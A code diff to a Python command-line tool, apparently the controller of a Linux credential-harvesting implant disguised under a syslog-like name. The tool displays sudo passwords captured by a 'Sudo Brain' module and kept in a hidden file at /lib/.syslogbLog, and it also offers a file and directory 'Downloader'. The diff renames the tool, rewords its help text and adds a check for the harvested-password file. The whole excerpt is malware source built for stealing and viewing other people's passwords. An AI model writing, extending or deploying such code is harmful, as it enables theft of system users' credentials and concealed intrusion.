@@ -5,7 +5,7 @@ from sys import argv
 
 def main():
     if(len(sys.argv) != 2):
-        print("Usage: syslogb {command}")
+        print("Usage: syslogT {command}")
     else:
         option = sys.argv[1]
         if(option.lower() in ('xyz')):
@@ -20,7 +20,7 @@ def main():
             
             -s, --status | displays current module status.
             
-            -p, --pass   | displays current saved passwords collected by "Sudo"
+            -p, --pass   | displays current saved passwords collected by the modules.
             
             """)
         elif(option.lower() in ('s', '--status')):
@@ -31,7 +31,10 @@ def main():
             else:
                 os.system("echo -e "+"Sudo Brain status: "+"\033[31m[INACTIVE]\033[0m")
         elif(option.lower() in ('p', '--pass')):
-            os.system("cat /lib/.syslogbLog | less")
+            if(os.path.exists("/lib/.syslogbLog")):
+                os.system("cat /lib/.syslogbLog | less")
+            else:
+                print("Harvested passwords from sudo not available.")
         elif(option.lower() in ('d', '--down')):
             print("Entering Downloader")
             option = input("(F)ile or (D)irectory: ")
